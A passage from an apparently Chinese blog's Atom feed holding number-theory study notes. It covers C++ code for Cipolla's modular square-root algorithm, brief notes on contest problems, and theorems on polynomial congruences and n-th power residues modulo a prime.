class="keyword">if</span>(Legendre(n) != MF(<span class="number">1</span>)) &#123; <span class="built_in">puts</span>(<span class="string">&quot;No root&quot;</span>); <span class="keyword">return</span>; &#125;</span><br><span class="line">        a = rng() % p;</span><br><span class="line">        <span class="keyword">while</span>(Legendre(a * a - n) != MF(<span class="number">-1</span>)) a = rng() % p;</span><br><span class="line"></span><br><span class="line">        F w(a, 1), res = qpow(w, (p + 1) / 2);</span><br><span class="line">        MF ans = res.x, ans2 = -ans;</span><br><span class="line">        <span class="keyword">if</span>(ans &gt; ans2) swap(ans, ans2);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; ans2 &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题解允许我先咕一下QAQ</p><h3 id="CF1091G-New-Year-and-the-Factorisation-Collaboration"><a href="#CF1091G-New-Year-and-the-Factorisation-Collaboration" class="headerlink" title="[CF1091G] New Year and the Factorisation Collaboration"></a>[CF1091G] New Year and the Factorisation Collaboration</h3><p> 蛮有意思的CF题，在Goodbye 2018里出的。</p><h3 id="BZOJ1406-AHOI2007-密码箱"><a href="#BZOJ1406-AHOI2007-密码箱" class="headerlink" title="BZOJ1406 [AHOI2007]密码箱"></a>BZOJ1406 [AHOI2007]密码箱</h3><p>题意：求下面同余方程的所有解：$(n\leq 2\cdot 10^9)$<br>$$<br>x^2\equiv 1 \pmod n<br>$$<br>解法：</p><p>对于方程 $x^2\equiv 1 \pmod{p^\alpha}$ ，只需要进行分类讨论，然后Hensel引理升幂。对于任意模数的情况，只需要再用CRT合并。</p><h3 id="SCOI2018-Numazu的蜜柑"><a href="#SCOI2018-Numazu的蜜柑" class="headerlink" title="[SCOI2018] Numazu的蜜柑"></a>[SCOI2018] Numazu的蜜柑</h3><h1 id="模素数的高次同余方程"><a href="#模素数的高次同余方程" class="headerlink" title="模素数的高次同余方程"></a>模素数的高次同余方程</h1><h2 id="模意义下的因式定理"><a href="#模意义下的因式定理" class="headerlink" title="模意义下的因式定理"></a>模意义下的因式定理</h2><p>现在我们要解决更加困难的问题了：给定整系数多项式 $f(x)$，求解 $f(x)\equiv 0 \pmod p$ 。对于实数域，有因式定理，即如果 $f(x)$ 有根 $c$，则 $f(x)$ 有因式 $(x-c)$。对于模意义下有没有类似性质呢？答案是肯定的。</p><blockquote><p>设 $p\nmid a_n$ ，若 $n$ 次同余方程 $f(x) \equiv 0 \pmod p$ 有 $k$ 个不同的解 $x\equiv c_1,\cdots,c_k \pmod p$ ，则一定存在唯一一对整系数多项式 $g_k(x), r_k(x)$，使得：<br>$$<br>f(x) = (x-c_1)\cdots(x-c_k)g_k(x) + p \cdot r_k(x)<br>$$</p></blockquote><p> 这个定理还有一种等价表述，即Lagrange定理：</p><blockquote><p>$f(x) \equiv 0 \pmod p$ 的解数 $k \leq \min(n,p)$</p></blockquote><p>结合上面定理，我们可以得到一个强有力的结论，即判别 $n$ 次方程恰有 $n$ 个解的方法：</p><blockquote><p>设 $a_n=1$ ，那么 $f(x) \equiv 0 \pmod p$ 的解数等于 $n$ 的充分必要条件是：存在整系数多项式$q,r$ ，且$r$ 次数小于 $n$，使得：<br>$$<br>x^p-x = f(x)q(x) + p\cdot r(x)<br>$$</p></blockquote><h2 id="n-次剩余"><a href="#n-次剩余" class="headerlink" title="$n$ 次剩余"></a>$n$ 次剩余</h2><p>由此，我们就具有了解决 $n$ 次剩余的理论基础。我们称 $x^n\equiv a \pmod p (p\nmid a)$ 为二项同余方程，而如果这个方程有解，则称 $a$ 为模 $p$ 的 $n$ 次剩余，否则为 $n$ 次非剩余。可以利用原根证明下面两个定理：</p><blockquote><p>若 $n\mid p-1$ ，则 $x^n\equiv a \pmod p (p\nmid a)$ 的充要条件是：<br>$$<br>a^{(p-1)/n} \equiv 1 \pmod p<br>$$</p></blockquote><blockquote><p>若 $n\nmid p-1$ ，令 $k=\gcd(n,p-1)$ 则 $x^n\equiv a \pmod p (p\nmid a)$ 的充要条件是：$x^k\equiv a \pmod p $ 有解，且解数相同。即有解的充分必要条件是：<br>$$<br>a^{(p-1)/k} \equiv 1 \pmod p<br>$$</p></blockquote><p>这样我们就找到了欧拉判别法的推广！我们也可以快速解决判断 $n$ 次剩余的问题了！可是还有没有类似勒让德符号的定义了呢，有没有互反律之类的东西了呢？在自然数范围内是没有了，如果使用代数数论的观点来看，应该还是有的，可是超出了我们的讨论范围。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近我一直在刷潘承洞、潘承彪的《初等数论》，感觉还是学到了不少东西呢。从现在我就来做一个数论之旅系列专题笔记吧，顺便也记录一下我的学习历程。&lt;/p&gt;
&lt;p&gt;这一次笔记对应的是《初等数论》第四章同余方程 4.5 到 4.9 的内容，主要介绍&lt;strong&gt;二次剩余理论，包括欧拉判别法，勒让德符号，二次互反律，雅克比符号&lt;/strong&gt;等，以及高次同余方程简介，给出了 $n$ 次剩余的判别公式。&lt;/p&gt;
&lt;p&gt;在开始之前约定一下我的记号吧。未经说明的任何字母都代表自然数，小写字母 $p$ 始终代表奇素数，而大写的 $P$ 则不一定。&lt;/p&gt;</summary>
    
    
    
    <category term="数学" scheme="http://yangdong2002.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="数论" scheme="http://yangdong2002.github.io/tags/%E6%95%B0%E8%AE%BA/"/>
    
    <category term="二次剩余" scheme="http://yangdong2002.github.io/tags/%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99/"/>
    
    <category term="n次剩余" scheme="http://yangdong2002.github.io/tags/n%E6%AC%A1%E5%89%A9%E4%BD%99/"/>
    
    <category term="数论之旅系列" scheme="http://yangdong2002.github.io/tags/%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%97%85%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
</feed>
